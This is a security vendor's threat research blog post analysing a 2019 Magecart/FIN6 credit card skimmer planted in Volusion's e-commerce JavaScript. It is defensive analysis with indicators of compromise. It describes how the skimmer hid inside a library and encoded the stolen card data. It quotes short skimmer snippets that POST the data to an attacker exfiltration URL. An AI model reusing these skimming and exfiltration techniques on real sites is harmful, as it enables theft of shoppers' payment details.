Trend Micro About TrendLabs Security Intelligence Blog Search:GotoÿHomeCategoriesHome . Bad Sites . FIN6 Compromised E-commerce Platform via Magecart to Inject Credit CardSkimmers Into Thousands of Online Shops FIN6 Compromised E-commerce Platform viaMagecart to Inject Credit Card Skimmers IntoThousands of Online Shops Posted on:October 9, 2019 at 6:18 pmPosted in:Bad Sites, Malware Author: Joseph C Chen (Fraud Researcher) Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion. We discovered that the online credit card skimming attack known as Magecart or E-Skimming was activelyoperating on 3,126 online shops. Our data shows that the attack started on September 7, 2019. All of theimpacted online shops are hosted on the cloud platform of the e-commerce service provider ¡°Volusion,¡± oneof the top e-commerce platforms in the market. This is actually the third time we have identi.ed a cardskimmer injected into the cloud platform of an e-commerce provider. Two other businesses were alreadyvictimized this year: a campus e-commerce platform and a hotel e-commerce platform. These targets are We found malicious code injected into a JavaScript library provided by Volusion to their client shops. Theinjected code loaded another JavaScript stored on a Google Storage service. The loaded script is almost adirect copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customerssubmit their payment information, the skimmer will copy and send the personal information and credit carddetails to an ex.ltration server belonging to the attackers. Our team contacted Google and they have removed the .le. The attack is currently of.ine. As of publication,Volusion has acknowledged and .xed the issue. Figure 1. Online credit card skimming attack chain Figure 2. Country distribution of online shop users who accessed the card skimmer (based on data from theTrend Microþ Smart Protection Networkþ infrastructure) During our investigation, we found that the attackers seemed more experienced and thoughtful than manyother skimmer groups. They did not simply add their malicious code at the top or end of a script; instead, theycarefully integrated the code into the original script to be part of the execution .ow of the program. The codewas also written as simply as possible, making it dif.cult to be identi.ed in a big library. Furthermore, theyregistered the domain of their ex.ltration server in a similar style to a legitimate Volusion domain. Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also beenidenti.ed as the notorious threat actor FIN6. We found similarities in the code used in this attack and the code used in FIN6¡¯s previous attacks on British Airways and Newegg. Analysis of the code injection The attackers injected their code into a library provided on Volusion¡¯s e-commerce platform for their clientshops. The script, described by the comments on the library, includes the necessary code for the pop-outfeature of the shop¡¯s navigation menu. It was also used on the shop checkout page. The script is located at: . hxxps://[online shop domain]/a/j/vnav.js The attackers didn¡¯t just inject their code inside the library. They also integrated their code into the originalfunction of jQueryUI code to be executed with the original execution .ow. They created a new object¡°e.widget.unbridge¡± right before the original object ¡°e.widget.bridge¡± and the malicious code is inside thenew object. It¡¯s worth noting that the attackers even wrote their malicious code in a similar coding style tomake it look more like a part of the original source code. The injected object will create a new script element to load another remote script stored on Google Storage. Figure 3. Malicious script injected into Volusion¡¯s JavaScript library Figure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injectedmalicious code is highlighted Analysis of the credit card skimmer The loaded remote script is on Google Storage: . hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js Much of the code inside the script is from the library ¡°js-cookie¡± version 2.2.1. However, the attackersmodi.ed it and integrated a credit card skimmer into the original script. The skimmer binds at the events¡°mousedown¡± and ¡°touchstart¡± of the payment submit button. This means that when victims click (from desktop) or touch (from mobile devices) the submit button, theevents will be triggered and the skimmer will be executed. Figure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original ¡°js-cookie¡±library (right) The skimmer copies the information on the entire payment form: the victim¡¯s name, address, phone number,email address, and credit card details (the number, cardholder name, expiration month, expiration year, andCVV number). Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it withBase64. Then, it performs a character permutation on the encoded string to make sure it can¡¯t be directlydecoded with Base64 decoding. The data will then be stored in sessionStorage with the key ¡°__utmz_opt_in_out¡±. The next time the skimmeris loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and itwill use HTTP POST to send the stolen payment information to a remote server at ¡°hxxps[:]//volusion.cdn[.]com/analytics/beacon¡± for ex.ltration. Note that the attackers used the domain ¡°volusion-cdn[.]com¡± for their ex.ltration server, a similar name toVolusion¡¯s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage isbecause Volusion is also running its service on the Google Cloud Platform. Evidence of Magecart or FIN6 As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6,also known as the threat actor FIN6. Here are the connections we considered: Group 6 is known to only target top-tier victims, investing in scams where they can receive a bigpayoff from one attack. This single hack of Volusion allows them to receive credit card data from 3,126online shops.From the previous skimming attack on the British Airways and Newegg websites, we know that Group6 tried to register the domains of the ex.ltration server to be similar to the victims¡¯ domains. In thiscase, the domain of the ex.ltration server is ¡°volusion-cdn[.]com¡± ¡ª very similar to the valid domain¡°cdn3[.]volusion[.]com¡± from Volusion. In addition, the ex.ltration domains used during the BritishAirways, Newegg, and Volusion attacks are all registered through Namecheap. We found that the skimmer is an improved version of the previous skimmer used in the attacks onBritish Airways and Newegg. Both old and current skimmers are written with jQuery, serialize thestolen data, and use the jQuery.ajax function to POST data to a remote server. Although the olderskimmer is much simpler compared to the current one, it didn¡¯t encode the stolen data or store the datain sessionStorage before the ex.ltration. Target Script of data ex.ltration request British Airways jQuery.ajax({type:¡±POST¡±,async:0,url:¡±[ex.ltrationurl]¡±,data:t,dataType:¡±application/json})jQuery.ajax({type:¡±POST¡±,async:true,url:¡±[ex.ltration Newegg url]¡±,data:pdati,dataType:¡±application/json})$.ajax({type: ¡®POST¡¯,url: ¡®[ex.ltration url]¡¯,dataType: Volusion ¡®application/x-www-form-urlencoded¡¯,data: d,complete: function(){ window.sessionStorage.removeItem(¡®__utmz_opt_in_out¡¯); }}) It¡¯s also interesting to see that the skimmer in this attack binds to event ¡°mousedown¡± and event ¡°touchstart¡±of the payment submit button. The previous Group 6 skimmer binds to event ¡°mouseup¡± and event¡°touchend¡±. These events are different, but they are the pairs of each other that trigger the skimmer at almost the sametime. It seems that they want to trigger the skimmer at the same moment, but the current version binds on twoopposite events of the pairs to avoid detection from heuristic rules. Target Script of event binding British Airways .bind(¡°mouseup touchend¡±, function(a) {ÿ})Newegg .bind(¡°mouseup touchend¡±, function(e) {ÿ})Volusion .bind(¡®mousedown touchstart¡¯, z) It seems that Magecart is continuing to change and experiment with new attack methods, re.ning its skimmerto evade detection. Sophisticated groups such as these will always try to .nd new ways to stay undetected intheir victims¡¯ systems. To defend against this type of threat, website owners should regularly check and strengthen their securitywith patches and server segregation. Site owners should also employ robust authentication mechanisms,especially for those that store and manage sensitive data. IT and security teams should restrict or disableoutdated components and habitually monitor websites and applications for any indicators of suspiciousactivity that could lead to data ex.ltration, execution of unknown scripts, or unauthorized access andmodi.cation. The following Trend Micro solutions, powered by XGenþ security, protect users and businesses by blockingthe scripts and preventing access to the malicious domains: Trend Micro SecuritySmart Protection Suites and Worry-Freeþ Business SecurityTrend Micro Network Defense Hybrid Cloud Security Researcher Marcel Afrahim also published a Medium post on this case. Indicators of Compromise Indicator Attribution Detection name FIN6 ex.ltrationvolusion-cdn[.]com server domain FIN6 https[:]//volusion-cdn[.]com/analytics/beacon ex.ltration server URL FIN6 credit https[:]//storage[.]googleapis[.]com/volusionapi/resources.js card skimmer URL FIN6 credit TrojanSpy.JS. 2348433df49e73217969a45726c53441f092c4a6fce57d1d58a6cf79d3976058 card skimmer MAGECART. hash C FIN6 credit TrojanSpy.JS. cee25c699a14a04c6e1b6e6fcd5ce7d4414c9f324b62509a7af14ae5bf749af8 card skimmer MAGECART. hash D d03f18a71ce059a79840a38aad4944426f0524bbd68a7a8fb7003c82996e6533 FIN6 credit TrojanSpy.JS. card skimmer MAGECART. hash D A Volusion spokesperson has added the following statement: ¡°Volusion was alerted of a data security incident and can con.rm that it was resolved within a few hours ofnoti.cation. We are coordinating with authorities on this matter, and continue to enhance our systems thatdetect and prevent unauthorized access to user accounts. A limited portion of customer information was compromised from a subset of our merchants. This includedcredit card information, but not other associated personally identifying details. We are not aware of anyfraudulent activity connected to this matter. Volusion has taken action to help secure accounts, and we are continuing to monitor this matter in order toassure the security of our merchants.¡± Related Posts: Magecart Skimming Attack Targets Mobile Users of Hotel Chain Booking WebsitesMirrorthief Group Uses Magecart Skimming Attack to Hit Hundreds of Campus Online Storesin US and Canada Old Tools for New Money: URL Spreading Shellbot and XMRig Using 17-year-old XHideNew Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware: ENTERPRISE . SMALL BUSINESS . HOME . Tags: credit cardecommerceFIN6MagecartSkimmer Security Predictions for 2020 Cybersecurity in 2020 will be viewed through many lenses ¡ª from differing attacker motivations andcybercriminal arsenal to technological developments and global threat intelligence ¡ª only sodefenders can keep up with the broad range of threats.Read our security predictions for 2020. Business Process Compromise Attackers are starting to invest in long-term operations that target speci.c processes enterprises rely on.They scout for vulnerable practices, susceptible systems and operational loopholes that they canleverage or abuse. To learn more, read our Security 101: Business Process Compromise. Recent Posts Outlaw Updates Kit to Kill Older Miner Versions, Targets More SystemsMalicious Optimizer and Utility Android Apps on Google Play Communicate with Trojans that InstallMalware, Perform Mobile Ad FraudSecurity Analysis of Devices That Support SCPI and VISA ProtocolsJanuary Patch Tuesday: Update List Includes Fixes for Internet Explorer, Remote Desktop,Cryptographic BugsFirst Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APTGroup Popular Posts Security Analysis of Devices That Support SCPI and VISA Protocols January Patch Tuesday: Update List Includes Fixes for Internet Explorer, Remote Desktop,Cryptographic Bugs First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APTGroup Why Running a Privileged Container in Docker Is a Bad Idea Looking into Attacks and Techniques Used Against WordPress Sites Stay Updated YouremailhereSubscribeEmail Subscription Home and Home Of.ce |For Business |Security Intelligence|About Trend Micro Asia Paci.c Region (APAC): Australia / New Zealand, ÖÐ¹ú, .±¾, ...., Ì¨. Latin America Region (LAR): Brasil, M¨¦xico North America Region (NABU): United States, Canada Europe, Middle East, & Africa Region (EMEA): France, Deutschland / .sterreich / Schweiz, Italia,§²§à§ã§ã§Ú§ñ, Espa.a, United Kingdom / Ireland Privacy StatementLegal Policies Copyright ý 2020 Trend Micro Incorporated. All rights reserved. 